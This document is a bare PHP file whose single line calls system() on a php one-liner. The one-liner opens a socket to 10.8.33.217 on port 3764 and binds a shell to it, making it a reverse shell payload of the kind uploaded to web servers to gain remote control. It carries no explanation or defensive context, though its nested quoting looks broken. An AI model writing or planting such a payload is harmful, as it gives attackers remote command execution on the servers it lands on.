<?php

system("php -r '$sock=fsockopen("10.8.33.217",3764);shell_exec("sh <&3 >&3 2>&3");'");

?>
